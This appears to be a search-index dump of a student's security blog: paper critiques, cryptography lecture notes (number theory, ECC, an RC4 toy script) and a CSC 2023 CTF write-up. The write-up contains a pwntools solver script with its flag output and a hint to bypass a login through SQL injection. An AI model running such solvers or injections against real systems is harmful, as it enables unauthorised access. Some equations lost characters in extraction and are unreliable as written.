Deployment Python Flask – Read Form Data from Request Cookie-Based Authentication # Get and set cookies with Flask Python Flask – Read Form Data from Request JWT-Based # [筆記] 透過 JWT 實作驗證機制 JWT(JSON Web Token) — 原理介紹 JSON Web Tokens Encoder/Decoder 3.C # 在Python中使用GMP（gmpy2） binascii.Error: Incorrect padding problem in run code gives Error: Non-base32 digit found pyauth/pyotp Week12 - 要在不同Server間驗證JWT好麻煩嗎？RS256提供你一種簡單的選擇 - JWT篇 [Server的終局之戰系列] \u0026lsquo;bytes\u0026rsquo; object has no attribute \u0026lsquo;oid\u0026rsquo; EMSA-PKCS1-v1_5 Specification EMSA_PKCS1_V1_5_ENCODE Implementation Generate PEM file with specified RSA parameter How can I generate rsa public key with specified n and e parameter by using openssl? How can I generate JWT token using HMAC? How is the signature created? JWT encoding using HMAC with asymmetric key as secret 3.E # X-Forwarded-For Intruder帳密暴力破解與列舉FUZZING找漏洞的好幫手 Intruder Attack type \u0026amp; Payloads - 擁有千種姿態的攻擊模式 4. Accumulator # 淺談 RSA Accumulator 歐拉定理的介紹 歐拉函數的觀察 歐拉函數的計算法 歐拉定理的論證 "},{"id":60,"href":"/security/course/ntu-cns/homework/cryptography-and-network-security--hw0/","title":"Cryptography and Network Security – HW0","section":"Securities","content":" Cryptography and Network Security – HW0 # Reading Topic: The Tangled Web of Password Reuse # tags: NTUCNS # Name: 何秉學\tStudent ID: R11921A16\nSummary # Password security is a critical issue that we may pay attention. However, most people choose easy-remembered strings as their online-service password, which may cause the users to re-used the password as a different online service. Unfortunately, the number of network attacks is increasing, and attackers contain tons of users\u0026rsquo; information including re-used passwords. They tried to propose a guessing password algorithm including character sequence, deletions, insertion, capitalization, reversal, leet-speak, and substring movement to guess a series of candidate passwords that users may use at different websites according to a set of leaked passwords. Their prototype guessing algorithm is able to crack approximately 10% of the nonidentical password pairs in less than 10 attempts and approximately 30% such pairs in less than 100 attempts.\nStrength # The data set they collect is publicly announced The experiment proves that the hypothesis is true, that is, the passwords used by the same user on different websites have a very high similarity, and on the contrary, the passwords used by different people on the same website have very low similarity. To connect with the real world, a poll was specially conducted, and the results of the poll were compared with the data of the original experiment, which can strengthen the purpose of this paper. For partially identical substrings, our method requires significantly fewer guesses than ED-guesser, thus making the authors\u0026rsquo; method suitable for online attacks where the number of guesses is limited to a fixed number. Weakness # It\u0026rsquo;s hard to guess the totally different and non including sub-string password The number of the testing data is quite few Reflection # Most of the people(43% in 6077 data) will re-use an identical password for different websites and the rest of the users will just modify part of them. This may cause critical security concerns. If I were the core leader of this team, I would connect deep learning and simple cracking algorithm as this paper proposed. My perspective is all passwords used by the same person should have a stronger correlation, so if you can use the general rules that most people will use in the early stage, and when you crack more passwords, you can use them individually for individuals predictors based on their respective modification habits, which should greatly increase the accuracy of predictions. "},{"id":61,"href":"/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-3/","title":"Cryptography and Network Security – Regular Critique 3","section":"Securities","content":" Cryptography and Network Security – Regular Critique 3 # Reading Topic: Automated Detection of IPv6 Privacy Leakage in Home Networks # tags: NTUCNS # Name: 何秉學\tStudent ID: R11921A16\nBackground # What is Customer Premise Equipment? - 用戶終端設備(CPE)\n英文名稱為Customer Premise Equipment，是指網路連接至用戶端的相關設備，包括數據機、寬頻路由器、寬頻閘道器等，但隨著電信網路應用服務逐漸多元化，只要是用戶端所使用的網路服務設備，都可稱為CPE裝置，包括VoIP閘道器、IP phone、雙模手機、IP STB等。\nWhat is EUI-64?\nIPv6 Address太長，要網管人員逐個Interface設定IPv6 Address肯定是件痛苦的事。EUI-64讓我們只需幫Interface试定Prefix部份,然後Interface就會用MAC Address自動產生Interface ID，基於MAC Address 獨一無二，利用 EUI-64 必能生成獨一無二的 IPv6 Address。EUI-64 產生 Interface ID 的辦法是先把MAC Address （共48 Bits）斬開兩等份.中間插入FFFE供16 Bits），使其成為64 Bits，然後把第7 Bit由0改成1。最後在前面加上Prefix歟成為一組IPv6 Address 了。\n舉例，MAC Address : 00:50:56:C1:A0:E8 中間插入 FFFE 使其成為 EUI-64 Interface ID : 0050:56FF:FEC1:A0E8 最後把第 7 Bit 改成 1 : 0250:56FF:FEC1:A0E8\nWhat is Stateless Address Autoconfiguration (SLAAC)?\nStateless Address Autoconfiguration (SLAAC) 在IPv4中我們可以透過DHCP讓 Interface自動獲PAddes,而在 Pv6 透Autoconfigurion來獲取IP Address前的部份說過EU-64可以幫我自生InterfaceD,所以現在解洪的就是她何獲取Prefix?IPv6用的是StatelessAddressAutoconfiguratio(狀態位址自動配置),Intface向Link-Local 發出 RS (Router Solicitation),IPv6 Router 可以回應RA(Router Advertisement),提供Prefix 資訊現誠把R1設定uer,R2嘗試透過AACA Summary # We know that legacy deployment of IPv6 has leaked device identities problem. Thus, one of the solutions is privacy extensions to the IPv6 addressing mechanism. But still, it has its problem that will allow an adversary to track all users across the network, correlate users’ activities over time, or extract users’ precise geolocation. They tried to propose a tool that can allow users with minimal technical expertise to scan their local home networks to identify the IPv6-leaking devices and observe their ISP\u0026rsquo;s prefix rotation policy.\nStrength(s) of the paper # They provide a tool that can view the prefixes assigned to them by their ISP and whether they are rotated on the IPv6-enabled devices that use legacy configurations of the standard. Also, they provided their tool\u0026rsquo;s user-friendly user interface that allows users to easily scan and see devices. Moreover, this paper is aimed to encourage more users to understand the issue of IPv6 privacy so they can drive the efforts to develop a more privacy-preserving IPv6 ecosystem, therefore, promotion is more important than the substance itself. I think this is a good chance for a normal user to be aware of this issue.\nWeakness(es) of the paper # My perspective is the novelty of this paper\u0026rsquo;s contribution is not very state-of-the-art. Technically, it just provides a tool that is based on some previous technique so it has not had very high technical content. And in this paper, I think some of the terminologies are quite hard to understand and I hope they can describe it more to let me know the situation, the problem they encountered, the proposed method, etc.\nYour own reflection # Their starting point is they want more people to know what some issues or threats about IPv6 that more people used in recent years. Therefore, they provided a tool with a user-friendly UI that can let the user easily detect everything that they should pay attention to. However, if I were the author, I\u0026rsquo;ll use a more approachable perspective or friendly terminology to tell my user what\u0026rsquo;s going on with this issue and what the challenges we face are so that they can attempt to understand this important issue. In addition, as the author said in the future work section, they tried to let these tools not just work locally and they\u0026rsquo;ll try to use network traffic analysis to analyze more impact, however, some important info they store has some privacy problems. This is another issue they have to consider.\n"},{"id":62,"href":"/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-4/","title":"Cryptography and Network Security – Regular Critique 4","section":"Securities","content":" Cryptography and Network Security – Regular Critique 4 # Reading Topic: Dos and Don\u0026rsquo;ts of Machine Learning in Computer Security # tags: NTUCNS # Name: 何秉學\tStudent ID: R11921A16\nSummary # In this paper, they tried to point out some pitfalls of computer security paper that are associated with machine learning. Especially the paper in the last 10 years published at top-tier conferences. In addition, they identify 10 common pitfalls such as sampling bias problems, label inaccuracy, data snooping problems, spurious correlations, etc that are associated with the whole machine learning workflow, i.e. data collection and labeling, system design and learning, performance evaluation and deployment, and operation. They also provide some recommendations and some remedies and try to mitigate the threat. The top 3 pitfalls in their research are sampling bias, data snooping, and lab-only evaluation.\nStrength(s) of the paper # The various pitfalls proposed in the article can actually be widely applied in various fields, not only limited to network security, but even biological sciences, horticultural fruit tree growth models, etc., you should pay attention to these issues The author not only asks questions, but also puts forward some possible mitigation solutions, and even gives suitable examples in the field of network security at the end, so that readers can understand how serious the harm will be after the superposition of various traps.\nWeakness(es) of the paper # For those who do not pay attention to this field, they will half-understand the description of those pitfalls, especially when describing, they are not very good at giving examples or simply explaining the problems behind the cited papers, which makes it very difficult to read.\nYour own reflection # I learned that the various pitfalls mentioned in the article may appear at each stage of introducing machine learning. Therefore, while doing relevant research, we must actively examine the data at each stage and evaluate the final results, to avoid hard work. The research done goes down the drain. In addition, this also reminds me of what my seniors mentioned before. Before introducing machine learning, we should think about the correctness, completeness, and availability of information, and then consider whether there is a simple way to use the model basis for the paper. Not everything has to be related to machine learning. After all, it can be processed more simply, which means that the calculation is more efficient, the energy consumption is lower, etc. If I were the author, I would spend more space explaining the articles cited in each trap, their research titles, and their relationship with the trap, so that readers can better feel the seriousness of the harm\n"},{"id":63,"href":"/security/course/ntu-crypto/cryptography-lec-1overview---notes/","title":"Cryptography Lec 1(Overview) - Notes","section":"Securities","content":" Cryptography Lec 1(Overview) - Notes # tags: Cryptography NTU # Background # Chosen Plaintext Attack(CPA security) Attacker只可以拿到plaintext相對應的ciphertext，通常是在同一把key重複使用的情況下\nChosen Cipnertext Attack(CCA security) Attacker不只可以拿到plaintext相對應的ciphertext，他也可以知道ciphertext相對應的plaintext，進而得知很多額外的資訊\nMode of Operation e.g. ECB, CBC, CTR, GCM\u0026hellip;(Nonsecure $\\to$ Secure) 選擇甚麼樣的mode和選擇麼加密演算法是完全獨立的事情，也可以每一個block都使用完全不同的加密演算法\n"},{"id":64,"href":"/security/course/ntu-crypto/cryptography-lec-2historical-ciphers---notes/","title":"Cryptography Lec 2(Historical Ciphers) - Notes","section":"Securities","content":" Cryptography Lec 2(Historical Ciphers) - Notes # tags: Cryptography NTU # :::spoiler 資訊安全筆記2 The Vigen\u0012ere Cipher\nThe Vigenere Cipher是一種\u0026quot;polyalphabetic cipher\u0026quot;用一串的 Key 不斷地重複！例如 abcabcabcabc 計算方法： 例如key = d 代表a會變成d所以 w 會變成 Z\n課本上的例子： :::\n:::spoiler Playfair Cipher\nThe Playfair Cipher Encryption Algorithm: The Algorithm consists of 2 steps:\nGenerate the key Square(5×5): Algorithm to encrypt the plain text: The plaintext is split into pairs of two letters (digraphs). If there is an odd number of letters, a Z is added to the last letter. \u0026gt; For example: PlainText: \u0026quot;instruments\u0026quot; After Split: 'in' 'st' 'ru' 'me' 'nt' 'sz' :::info Note that: Pair cannot be made with same letter. Break the letter in single and add a bogus letter to the previous letter. :::\nPlain Text: “hello” After Split: ‘he’ ‘lx’ ‘lo’ Here ‘x’ is the bogus letter.\nIf the letter is standing alone in the process of pairing, then add an extra bogus letter with the alone letter Plain Text: “helloe” After Split: ‘he’ ‘lx’ ‘lo’ ‘ez’ Here ‘z’ is the bogus letter.\nException # :::\nIntroduce the encryption flow of Enigma WWII納粹德國密碼機Enigma\n"},{"id":65,"href":"/security/course/ntu-crypto/cryptography-lec-3mathematical-background---notes/","title":"Cryptography Lec 3(Mathematical Background) - Notes","section":"Securities","content":" Cryptography Lec 3(Mathematical Background) - Notes # tags: Cryptography NTU # Background # :::spoiler Euclidean Algorithm(輾轉相除法) Given $a$ and $b$ with $a \\ge b$ Compute $gcd(a,\\ b)=gcd(b,\\ a\\ mod\\ b)$, $gcd(a,\\ 0)=a$ For example $$ Compute\\ gcd(140,\\ 297)\\ 297=2140+17 \\ 140=817+4 \\ 17=44+1 \\ 4=44+0 $$ Then we found the $gcd(140,\\ 297)=1$\nAnother Example: $$ Compute\\ gcd(270,\\ 192)\\ 270=1192+78\\ 192=278+36\\ 78=236+6\\ 36=66+0 $$ Then we found $gcd(270,\\ 192)=6$ :::\n:::spoiler Extended Euclidean Algorithm 其實就只是把原本用Euclidean Algorithm算出來的$gdc(a,\\ b)$，變成Linear Combination的形式而已 For example above: As we know $gcd(270,\\ 192)=6$, then\u0026hellip; $$ 6=78-362\\ 36=192-278\\ 78=270-1192 $$ $$\\downarrow$$ $$ \\begin{aligned} 6\u0026amp;=78-(192-278)2\\ \u0026amp;=78-[192-2(270-1192)]2\\ \u0026amp;=78-[1923-2270]2\\ \u0026amp;=270-1192-1926+4270\\ \u0026amp;=2705-7192 \\end{aligned} $$ Then we know the linear combination coefficient of $gcd(270,\\ 192)$ is $+5$ and $-7$ :::\n:::spoiler 質數愈大愈孤獨：談質數分布 Prime Number Theorem: $$\\lim\\limits_{x\\to \\infty}{x \\over \\pi(x)}=\\ln(x)$$ :::\nGood Reference about Linear Algebra: 大學基礎代數 :::spoiler Linear Algebra - Group 純量加法的代數結構稱為阿貝爾群(Abelian Group)。考慮整數集 $\\mathbb{Z}$ (包含正整數、負整數與零)，我們觀察出任兩個整數的加法運算滿足以下五個性質：\n加法具有封閉性，如果 $x$ 和 $y$ 屬於 $\\mathbb{Z}$，那麼 $x+y$ 也屬於 $\\mathbb{Z}$。 加法具有交換性，兩整數之和與其計算位置無關 $x+y=y+x$ 加法具有結合性，排序固定的三個整數之和與其執行加法的順序無關， $(x+y)+z=x+(y+z)$ 存在一整數 0 使得任何整數與其相加皆不改變， $x+0=0+x=x$， 因此 0 也稱為加法單位元。 任何加法都可以「回復」，意即每一整數皆存在逆元，如下： $x+(-x)=(-x)+x=0$。 再舉一個例子 考慮正實數集 $\\mathbb{R}_{+}$，並以 $\\times$ 表示一般的乘法運算：\n$x\\times y=xy$。\n明顯地，正實數乘法滿足封閉性、交換性與結合性。上例中 $0$ 的角色被實數 $1$ 所取代，$1$ 稱為乘法單位元，滿足下式： $x\\times 1=1\\times x=x$\n每一個正實數 $x$ 的逆元為其倒數，因為 $\\displaystyle x\\times\\left(\\frac{1}{x}\\right)=\\left(\\frac{1}{x}\\right)\\times x=1$。\nExample of Groups: Addition: Integers, Reals, Rationals Multiplication: Nonzero Reals, Rationals\n:::success 上例整數 $\\mathbb{Z}$ 的加法 $+$ 與正實數 $\\mathbb{R}_{+}$ 的乘法 $\\times$ 共同滿足的五個性質即為阿貝爾群的定義。正式地說，給定一個集合 ${G}$ 與二元運算 $\\ast$，若滿足上述五個性質，即封閉性、交換性、結合性，存在一運算單位元，且每一元素皆存在對應的逆元，我們便稱 $({G},\\ast)$ 為阿貝爾群。 :::\n:::spoiler 【代數】Field：體\nDef：Field 一個Field $\\mathbb{F}$定義在一個集合與兩種運算方式之下，兩種運算分別為加法($+$)與乘法($*$)。若 a, b, c為F中的元素，則具有以下性質：\n乘法與加法封閉性與唯一性：$a + b$ 與 $a * b$ 唯一且皆屬於$\\mathbb{F}$ 乘法與加法單位元素：$0$、$1$ 屬於$\\mathbb{F}$，使得 a + 0 = a 且 a * 1 = a 乘法與加法反元素：任意$a$皆存在$b$、$c$ ，使得$a + b = 0$、$a * c = 1$，(只有$0$沒有乘法反元素) 乘法與加法交換律：$a + b = b + a$、$a * b = b * a$ 乘法與加法結合律：$(a + b) + c = a + (b + c)$、$(a * b) * c = a * (b * c)$ 乘法對加法的分配律：$a * (b + c) = ab + ac$ $\\mathbb{R}$是一個Field、有理數也是一個 Field、$Z2：{0, 1}$，其中$1 + 1 = 0$，其餘運算與與正常運算相同，這也是一個Field。 經由加法與乘法反元素，可以定義減法與除法為與反元素相加或相乘。\n:::info Field\u0026rsquo;s order代表field elements的數量，所以若是一個field的order是finite，就是一個finite field(Galois Fields)，通常會表示成$GF(p)$\n:::\n:::spoiler 環 (Ring) 與體 (Field)\n環是一個擁有兩個二元運算的集合，通常以加法和乘法表示，此集合在加法下會構成一個可交換群，並在乘法下構成一個 monoid，同時乘法對加法具有分配律，也就是說，滿足以下性質的集合就稱為一個環：\n具有加法及乘法運算，且具有封閉性。 有加法單位元 0。 有加法反元素 -a。 有加法結合律。 有加法交換律。 有乘法單位元 1。 有乘法結合律。 $a*(b+c) = ab + ac$ $(b+c)a = ba + c*a。$ ::: :::spoiler Polynomial Rings 其實就是一般的Rings只是裡面的元素都是由多項式組成 而我們說$f$ is irreducible over $R$代表$f$不能分解成degree是正的多項式乘積(簡單來說就是不能因式分解) :::info 承接上述的$GF(p)$為例，若是$GF(2)$就代表多項式的元素之間在做加減等運算時，每一個項的係數都要$mod\\ 2$，例如： $$f(x)=x^7+x^5+x^4+x^3+x+1$$ $$g(x)=x^3+x+1$$ $$f(x)+g(x)=x^7+x^5+x^4$$ 因為其他項次的係數$mod\\ 2$之後就變成零了\n多項式找最大公因式也可以使用Euclid\u0026rsquo;s Algorithm ::: :::spoiler Euler φ function φ(n)：比$n$小且與$n$互質的數的數量 :::\n:::spoiler 數論篇 What is $\\mathbb{Z}, \\mathbb{Z}_n, \\mathbb{Z}_n^, \\mathbb{Z}_p, \\mathbb{Z}_p^$\nReference: 密碼學卷宗 數論篇 - 上卷 密碼卷宗 數論篇 - 下卷, Difference between $Z_n^*$ and $Z_n$[closed]\n$\\mathbb{Z}$整數集合 * 是從負無窮大到正無窮大的所有整數形成的集合 * $\\mathbb{Z} = { \u0026hellip;,-2,-1,0,1,2,\u0026hellip; }$ $\\mathbb{Z}_n$餘數集合 * 模運算產生的集合，被稱為「模$n$之最小餘數集合(Set of least residues modulo n)」 * $\\mathbb{Z}_n = {0,1,2,3,\u0026hellip;,(n-1)}$ * 比較 $\\mathbb{Z}$ 和 $\\mathbb{Z}_n$ $\\mathbb{Z}_n^$ $\\mathbb{Z}_n^$ doesn\u0026rsquo;t mean $\\mathbb{Z}_n−{0}$. You must remove all elements that are not invertible mod $n$, which is equivalent to keeping only the elements that are coprimes to $n$. For example: $Z_9^*={1,2,4,5,7}$. $\\mathbb{Z}_p$ $\\mathbb{Z}_p$就是上述的概念只是$n$一定是prime number，另外$\\mathbb{Z}_p^$就是$\\mathbb{Z}_p$除去0，意味着$\\mathbb{Z}_p$中的所有元素都是可逆的，0除外，而$\\mathbb{Z}_p^$的大小就是$p-1$ ::: :::spoiler 模運算 $$xy\\ mod\\ q=(x\\ mod q)(y\\ mod\\ q)\\ mod\\ q$$ :::\nChinese Remainder Theorem $\\to$ RSA # :::spoiler Fermat\u0026rsquo;s Little Theorem {%youtube SyK3IXPITco %} :::warning 假定 $a∈Z$，$p$是一個質數，且： $$(a,p)=1$$ 則： $$a^{p−1}≡1(mod\\ p)$$\n::: $\\downarrow$ 韓信點兵問題$\\to$RSA 密碼系統上的應用\nDiscrete Logarithms # :::spoiler Basic Definition If $g$ is a generator of $\\mathbb{Z}n^*$, then for all $y$ there is a unique $x$ such that $$y=g^x\\ mod\\ n$$ This is called discrete algorithm of $y$ and we use the notation $$x=\\log_g(y)$$ or more precisely: $$x=\\log{g,n}(y)$$ For example: :::\n:::spoiler Quadratic Residue\n「二次剩餘」定義 任意非零平方整數除以某個數後可能的餘數，我們稱之為「二次剩餘」。用數學式表達如下： For $x,m≠0$, $a$ is a quadratic residue $mod\\ m$ if $x^2=a\\ (mod\\ m)$. Otherwise, $a$ is a quadratic nonresidue(二次非剩餘).\n例如對模10而言，可能的餘數集合為{0,1,4,5,6,9}： $$ \\left{ \\begin{array}{c} 0^2≡0\\ 1^2≡1\\ 2^2≡4\\ 3^2≡9\\ 4^2≡6\\ 5^2≡5\\ 6^2≡6\\ 7^2≡9\\ 8^2≡4\\ 9^2≡1 \\end{array} \\ \\ mod\\ 10 \\right. $$ :::\n:::spoiler Blum Integers 簡單來說就是一個整數$N\\in\\mathbb{Z}$, 是兩個質數的乘積$N=pq$，而$p,\\ q$剛好滿足 $$ \\begin{aligned} 3\u0026amp;= q\\ (mod\\ 4)\\ 3\u0026amp;= p\\ (mod\\ 4) \\end{aligned} $$ 例如： $$ \\begin{aligned} 33\u0026amp;=311\\ 3\u0026amp;= 3\\ (mod\\ 4)\\ 3\u0026amp;= 11\\ (mod\\ 4)\\\\ or\\ 21\u0026amp;=3*7\\ 3\u0026amp;= 3\\ (mod\\ 4)\\ 3\u0026amp;= 7\\ (mod\\ 4) \\end{aligned} $$ :::\n:::spoiler Legendre Symbol 課本定義：Let $p$ be an odd prime and $a$ an integer. The Legendre symbol is defined to be $$ \\left(\\dfrac{a}{p}\\right)= \\left{ \\begin{array}{c} 0,\\ if\\ p|a\\ 1,\\ if\\ a\\in Q_p\\ -1,\\ if\\ a\\in \\overline{Q}_p \\end{array} \\right. $$\n代表的意義就是當$a$相對於$p$可以開根號的話，Legendre Symbol就是$1\\to$Quadratic Residue，否則就是$0\\to$Nonquadratic Residue :::\n:::spoiler 橢圓曲線密碼學Elliptic Curve Cryptography, ECC(觀念篇)\nDescription # 橢圓曲線密碼學（英語：Elliptic Curve Cryptography，縮寫：ECC）是一種基於橢圓曲線數學的公開密鑰加密演算法。橢圓曲線在密碼學中的使用是在1985年由Neal Koblitz和Victor Miller分別獨立提出的。\nECC的主要優勢是它相比RSA加密演算法使用較小的密鑰長度並提供相當等級的安全性[1]。ECC的另一個優勢是可以定義群之間的雙線性映射，基於Weil對或是Tate對；雙線性映射已經在密碼學中發現了大量的應用，例如基於身份的加密。\nTerminology # 橢圓曲線 橢圓曲線是由以下形式的方程式定義 的平面曲線 $${\\displaystyle y^{2}=x^{3}+ax+b,\\ where\\ a,b \\in \\mathbb{Z}}\\to Weierstrass方程式$$ 橢圓曲線運算規則(群組規則, Group)\nAddition\n過曲線上的兩點$P$、$Q$畫一條直線，找到直線與橢圓曲線的交點 $-R$ 交點關於$x$軸對稱位置的點，定義為$PQ$，即為加法。如下圖所示：$P+Q = R$ Multiplication(兩倍運算)\n上述方法無法解釋$PP$，即兩點重合的情況。因此在這種情況下，將橢圓曲線在$P$點的切線，與橢圓曲線的交點，交點關於$x$軸對稱位置的點，定義為$P+P$，即$2P$，即為二倍運算 無窮遠點\n如果將$A$與$-A$相加，過$A$與$-A$的直線平行於$y$軸，可以認為直線與橢圓曲線相交於無窮遠點。 Properties\n曲線上的任何點都以X軸反射(y=0),並且仍是同樣的曲線 (奇特的對稱性) 任何不垂直的線穿過曲線最多只會有三個交點 How to use the properties in Encryption System?\n將橢圓曲線比喻成擊球遊戲, 把球從A點擊向B點,當再碰撞到曲線上的點後會反彈到(x軸以上或以下)另一邊的C點，先想像成把球在兩個點移動稱為\u0026quot;打點(dot)\u0026quot;\nA dot B = C A dot A = B A dot C = D \u0026hellip; \u0026hellip; \u0026hellip;\n這裡只有兩個點(稱為: 最初點\u0026amp;最終點)，將最初的點P自行打點 n次(as Private Key) 會得到一個最終點Q(as Public Key)即使你知道\u0026quot;最初點\u0026quot;和\u0026quot;最終點\u0026quot;，要找出n是非常非常之困難! :::info\n橢圓曲線是連續的，容易被推算，因此，並不適合用於加密；所以，我們必須把橢圓曲線變成離散的點\n至於怎麼轉換可見原文，但轉換前後如下圖所示:\n::: :::spoiler Elliptic Curve Cryptography Application\nApplication RSA 同演算法可以直接實現簽章及加密，ECC 需要分別實作 ECDSA (Elliptic Curve Digital Signature Algorithm) ECIES (Elliptic Curve Integrated Encryption Scheme) ECDH (Elliptic Curve Diffie–Hellman key Exchange) TLS/SSL 數位憑證 基於身份加密 區塊鏈數位簽名 序號產生驗證 ECC 安全性 ECC 一樣採用數學難題，進行設計，但難度比REA 質因數分寫還要難，而且運算比RSA 還要快 :::warning 詳細例子的計算過程以及前面提到的有關橢圓曲線的描述可以參考(大推，講得非常清楚): Elliptic Curve Diffie Hellman :::\n:::spoiler Discrete Logarithm Problem 課本的說明：\n$(G\\ \\times)$是abelian group，在給定$g,\\ h \\in G$的情況下，要找到一個$x$(若其存在)使得$g^x=h$ 在$(\\mathbb{Z}/\\mathbb{NZ},\\ +)$很簡單 在$(GF(p),\\ +)$很困難(hard) 在Elliptic Curve groups超級困難\n"},{"id":66,"href":"/security/course/ntu-crypto/cryptography-lec-4information-theory---notes/","title":"Cryptography Lec 4(Information Theory) - Notes","section":"Securities","content":" Cryptography Lec 4(Information Theory) - Notes # tags: Cryptography NTU # Background # :::spoiler Shannon\u0026rsquo;s Theorem 假設：$(P,\\ C,\\ K,\\ e_k(\\cdot),\\ d_k(\\cdot))$是一個cryptosystem，且$P,\\ C,\\ K$各自集合的數量都是一樣的 則： $$此cryptosystem具有perfect\\ secrecy\\ iff\\ 每一把key被使用的機率都相同，i.e.{1 \\over #K}，且對於每個m\\in P和c\\in C都有一個獨立的key\\ k使得e_k(m)=c $$\n"},{"id":67,"href":"/security/course/ntu-crypto/cryptography-lec-5symmetric-key-cryptography---notes/","title":"Cryptography Lec 5(Symmetric Key Cryptography) - Notes","section":"Securities","content":" Cryptography Lec 5(Symmetric Key Cryptography) - Notes # tags: Cryptography NTU # Background # What is MDC and MAC? - 【CN007】数据安全笔记8 —— MDC 和 MAC\nMDC 是一種用於驗證數據完整性的摘要信息，保證數據沒有被更改。 # MAC 在 MDC 的基礎上增加了 Key 的使用。同時驗證數據完整性和發送者，保證發送者是特定人並且傳輸過程中數據沒有被更改。MAC 函數又稱為 Key 哈希函數（Keyed Hash Function） :::spoiler About RC4\n第一部分 前置作業\n建立一個 S-box（寫作 S） 決定密鑰 建立密鑰列表 K 第二部分 把 S 打亂\n第三部分 加密\nS = [0,1,2,3,4,5,6,7] K = [1,2,3,1,2,3,1,2] P = [5,3,6,7] j = 0 for i in range(8): j = ( j + S[i] + K[i] ) %8 S[i], S[j] = S[j], S[i] i, j = 0, 0 flag = 0 c_list = [] while flag \u0026lt; len(P): i = (i + 1) % 8 j = (j +S[i]) % 8 S[i], S[j] = S[j], S[i] t = (S[i] + S[j] ) % 8 k = S[t] k = \u0026#39;{:03b}\u0026#39;.format(k) p = \u0026#39;{:03b}\u0026#39;.format(P[flag]) c = \u0026#39;\u0026#39; for n in range(3): c += str(int(k[n])^int(p[n])) c_list.append(int(c, 2)) flag += 1 print(c_list) Drawback RC4在後來被指出他所產生的密鑰並不隨機，存在統計上的偏誤，並且密文有洩漏明文資訊的可能， 因此已不再被建議使用。 :::\nAbout Feistel Cipher About DES What is OFB and CFB?\nCFB：密文反饋模式 # 與CBC模式類似，但不同的地方在於，CFB模式先生成密碼流字典，然後用密碼字典與明文進行異或操作並最終生成密文。後一分組的密碼字典的生成需要前一分組的密文參與運算。 CFB模式是用分組演算法實現流演算法，明文資料不需要按分組大小對齊。\n# OFB：輸出反饋模式 # OFB模式與CFB模式不同的地方是：生成字典的時候會採用明文參與運算，CFB採用的是密文。\n"},{"id":68,"href":"/security/course/ntu-crypto/cryptography-lec-6key-agreement-protocol---notes/","title":"Cryptography Lec 6(Key Agreement Protocol) - Notes","section":"Securities","content":" Cryptography Lec 6(Key Agreement Protocol) - Notes # tags: Cryptography NTU # Background # About HSM(Hardware Security Module) - 什麼是硬體安全模組？\nWhat is Wide-Mouth Frog?\nThe Wide Mouth Frog Protocol is a computer network verification protocol typically used on unsecured networks. It permits people communicating over a network to verify their identity to each other, it also helps in preventing replay attacks, or snooping and offers detection of any alteration and the prevention of any unwanted reading. This can be demonstrated by means of BAN (Burrows–Abadi–Needham) logic. However, to avoid active attacks, some form of message authentication or authenticated encryption must be used.\nThe protocol can be specified as follows in security protocol notation, where user A is verifying itself to user B using a server S:\nWhere the identities of user A, user B, and the trusted server are A, B, and S respectively. Timestamps generated by user A and server S are TS1 and TS2 respectively. A Symmetric key KAS that is only known to A and S. A generated symmetric key KAB, which will be the session key of the session between user A and user B. A Symmetric key KBS that is only known to B and S. A → S: A, {T{S1}, B, K{AB}}K{AS} S → B: {T{S2}, A, K{AB}}K{BS} About Kerberos\n非常完整:+1: # About session hijacking - HTTP Session 攻擊與防護 "},{"id":69,"href":"/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/","title":"CSC 2023 決賽","section":"Securities","content":" CSC CTF 2023 決賽 # 隊伍名稱: 名字好難想RRRRRRRRRRRRRRR\n教學題 # Q4 # 題目敘述 # 成為「admin」並取得Flag\n[連線IP/連結資訊] http://192.168.100.71\n[備註] 答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}\nExploit # 這一題太難了，看了教學檔案還是沒辦法在有效時間內解出來，所以放棄 學長自述:\nQ5 # 題目敘述 # 壞壞恐怖組織要對這邊進行恐攻，丟了一顆定時炸彈，拆彈專家4你???拆彈成功領取豐沛的獎勵吧!\n[備註] 答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}\nExploit # 測驗智商用的，直接pwntools就可以了\nfrom pwn import * r = process(\u0026#39;./Bomb.exe\u0026#39;) r.recvuntil(b\u0026#39;P1ease count A(\u0026#39;) A = r.recvuntil(b\u0026#39;)\u0026#39;)[:-1].decode() sign = r.recv(3).decode() B = r.recvline()[2:-2].decode() log.info(f\u0026#39;A({A}) {sign} B({B}) = {eval(A + sign + B)}\u0026#39;) r.sendlineafter(b\u0026#39;Enter your answer: \u0026#39;, str(eval(A + sign + B)).encode()) r.interactive() $ python exp.py [+] Starting local process \u0026#39;./Bomb.exe\u0026#39;: pid 8143 [*] A(1507886) + B(7372399) = 8880285 [*] Switching to interactive mode Good job!\\(^^)/ CSC{FLAG_54v3th3d4y7777777}Time\u0026#39;s up! (っ•O•)╮ =͟͟͞͞●~* [*] Got EOF while reading in interactive Flag: CSC{FLAG_54v3th3d4y7777777}\n一般題 # Q1 # 題目敘述 # Company ABC is known to produce services to provide Web3 protection. This company specializes in Zero-knowledge proofs (ZKPs) for distributed devices.\nCompany ABC provides two services:\nABC_Prover (GetNewChallenge / Get LastValidChallenge), which gives a challenge, and ABC_Verify (VerifyAnswers), which expects a true/false response. If the challenge is answered correctly, the ABC_Verify returns a string with the secret flag. If the answer is wrong, it returns an error message. 5 attempts are allowed per challenge. If the 5 attempts are wrong, the challenge changes for a new one.\nBoth ABC_Prover and ABC_Verify are public services provided by the Company ABC as part of their products. You are a hacker who got access to the Example_Oracle (GetExamples) service, which was supposed to be used only for debugging inside the company. Your task is, based on the examples you can get from the Example_Oracle service, to break the ABC_Verify service and get the secret flag.\n[[IP Info./Website]] http://192.168.100.95:50000/WebService1.asmx\n[Notes] Input CSC Flag Format: CSC{FLAG_with max 25 characters}\nExploit # Q2 # 題目敘述 # 知識海洋學習無盡，從比賽中找到出口， Flag就藏在這未知的網站裡，嘗試潛入進去找到正確答案吧!\n[連線IP/連結資訊] 192.168.100.79\n[備註] 答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}\nHint # [提示一] 使用Nmap找到網站對外服務Port\n[提示二] 找到登入介面/tournament/login\n[提示三] 發現有開啟mysql服務，透過sql injection密碼是不是可以繞過\n[提示四] 原始碼裡有特定Url，搭配Cookie的token key解開API\n[提示五] 